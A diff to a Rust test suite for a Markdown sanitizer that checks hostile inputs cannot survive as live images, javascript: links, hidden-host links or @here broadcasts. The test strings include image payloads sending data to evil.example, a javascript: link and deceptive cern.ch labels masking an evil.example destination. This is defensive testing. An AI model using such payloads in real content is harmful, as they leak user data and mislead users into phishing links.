@@ -211,6 +211,15 @@ fn explain(src: &str) -> &'static str {
             Event::Start(Tag::Link { dest_url, .. }) if !allowed_url(&dest_url) => {
                 found = "2 link scheme"
             }
+            // FIX-142 review: no image opener / link joint inside math or HTML text.
+            Event::InlineMath(_) | Event::DisplayMath(_)
+                if src[r.clone()].contains("![") || src[r.clone()].contains("](") =>
+            {
+                found = "1 image opener in math";
+            }
+            Event::Text(_) if src[r.clone()].contains("![") => {
+                found = "1 image opener in text";
+            }
             Event::Start(Tag::HtmlBlock) | Event::InlineHtml(_)
                 if sanitize_html(&src[r.clone()]) != src[r.clone()] =>
             {
@@ -327,6 +336,14 @@ fn fragments() -> impl Strategy<Value = String> {
         "\u{0}",
         "[r]: javascript:x",
         "![a][r]",
+        "$![x](https://e.example/?d=S)$",
+        "$$![y](https://e.example/2)$$",
+        "![x](https://e.example/p.png =10x10)",
+        "<div>\n![x](https://e.example/?d=S)\n</div>",
+        "!<a href=\"https://e.example/p.png\">x</a>",
+        "<code>@here</code>",
+        "[https://cern.ch](http:e.example/l)",
+        "para\n[r]: https://e.example/\n![x][r]",
         "<",
         ">",
         "`",
@@ -336,6 +353,121 @@ fn fragments() -> impl Strategy<Value = String> {
         ")",
     ]);
     prop::collection::vec(frag, 0..12).prop_map(|v| v.join(" "))
+}
+
+// ---- FIX-142 (review) findings 2, 4, 5, 6 ----
+
+/// No image can form from the text `s`, whichever dialect reads it: pulldown (CommonMark/GFM) and
+/// Mattermost's marked (the `![` of an image anywhere outside code must not survive unescaped).
+fn no_live_image_opener(s: &str) -> bool {
+    let mut in_code = false;
+    for (e, r) in Parser::new_ext(s, options()).into_offset_iter() {
+        match e {
+            Event::Start(Tag::CodeBlock(_)) => in_code = true,
+            Event::End(pulldown_cmark::TagEnd::CodeBlock) => in_code = false,
+            Event::Code(_) => {}
+            Event::Start(Tag::Image { .. }) => return false,
+            Event::Text(_)
+            | Event::InlineMath(_)
+            | Event::DisplayMath(_)
+            | Event::Html(_)
+            | Event::InlineHtml(_)
+                if !in_code && s[r.clone()].contains("![") =>
+            {
+                return false;
+            }
+            _ => {}
+        }
+    }
+    true
+}
+
+#[test]
+fn math_cannot_carry_an_image_or_a_link() {
+    for src in [
+        "$![x](https://evil.example/?d=S)$",
+        "a $$![y](https://evil.example/2)$$ b",
+        "$$\n![z](https://evil.example/3)\n$$",
+        "$[x](javascript:alert(1))$",
+    ] {
+        let out = md(src);
+        assert!(no_live_image_opener(&out), "{src} -> {out}");
+        assert!(!out.contains("](javascript"), "{src} -> {out}");
+        assert_eq!(md(&out), out, "idempotent: {src}");
+    }
+    // Plain math is untouched.
+    assert_eq!(md("$a^2 + b_1$"), "$a^2 + b_1$");
+}
+
+#[test]
+fn an_image_opener_in_html_or_marked_only_forms_never_survives() {
+    for src in [
+        // Mattermost's image-size syntax: text to pulldown, an image to marked.
+        "![x](https://evil.example/p.png?d=S =10x10)",
+        "![x](https://evil.example/a b)",
+        // A definition right after a paragraph line, then a reference image (marked lets a definition interrupt a paragraph).
+        "para\n[r]: https://evil.example/?d=S\n![x][r]",
+        // Text inside an HTML block is Markdown once a connector converts the HTML.
+        "<div>\n![x](https://evil.example/?d=S)\n</div>",
+        "<span>![x](https://evil.example/?d=S)</span>",
+        "!<a href=\"https://evil.example/p.png?d=S\">x</a>",
+    ] {
+        let out = md(src);
+        assert!(no_live_image_opener(&out), "{src} -> {out}");
+        assert_eq!(md(&out), out, "idempotent: {src}");
+    }
+    // The opener inside code stays as written.
+    assert_eq!(md("`![x](y)`"), "`![x](y)`");
+    assert_eq!(md("```\n![x](y)\n```"), "```\n![x](y)\n```");
+}
+
+#[test]
+fn a_label_cannot_hide_the_destination_host() {
+    for (src, host) in [
+        // WHATWG URL rules: `http:host` has a host, `\` is a `/`.
+        ("[https://cern.ch](http:evil.example/login)", "evil.example"),
+        (
+            "[https://cern.ch](https:evil.example/login)",
+            "evil.example",
+        ),
+        // `\\` in the source is one backslash in the destination, which a browser reads as `/`.
+        (
+            "[https://cern.ch](https://evil.example\\\\@cern.ch)",
+            "evil.example",
+        ),
+        (
+            "[cern.ch](https://evil.example\\\\@cern.ch/x)",
+            "evil.example",
+        ),
+        ("[cern.ch](https:/evil.example/x)", "evil.example"),
+    ] {
+        let out = md(src);
+        assert!(out.ends_with(&format!("(→ {host})")), "{src} -> {out}");
+    }
+    // An honest link is untouched.
+    assert_eq!(
+        md("[https://cern.ch/a](https://cern.ch/b)"),
+        "[https://cern.ch/a](https://cern.ch/b)"
+    );
+    assert_eq!(
+        md("[cern.ch](https://www.cern.ch/)"),
+        "[cern.ch](https://www.cern.ch/)"
+    );
+}
+
+#[test]
+fn here_inside_html_code_is_code() {
+    for src in [
+        "see <code>@here</code> now",
+        "<code>@here</code>",
+        "<pre>@here</pre>",
+        "<kbd>@here</kbd> and <code>x @HERE y</code>",
+    ] {
+        let out = broadcast_here(&md(src));
+        assert!(!out.contains("<@here>"), "{src} -> {out}");
+    }
+    // Outside the tag it still is a broadcast.
+    assert!(broadcast_here(&md("<code>x</code> @here")).contains("<@here>"));
 }
 
 proptest! {
@@ -356,7 +488,9 @@ proptest! {
                 _ => {}
             }
         }
-        prop_assert!(!has_token(&out), "token formed: {out:?}");
+        prop_assert!(no_live_image_opener(&out), "image opener survived: {out:?}");
+        // A backslash-escaped `\<` (the data fallback) is inert text, not a token.
+        prop_assert!(!has_token(&out.replace("\\<", "")), "token formed: {out:?}");
         prop_assert!(out.chars().all(|c| !is_stripped(c) || c == '\u{200B}'), "stripped char: {out:?}");
         prop_assert_eq!(markdown_safe(&out, 5_000), out.clone());
         // `<@here>` exists only when the core adds it.
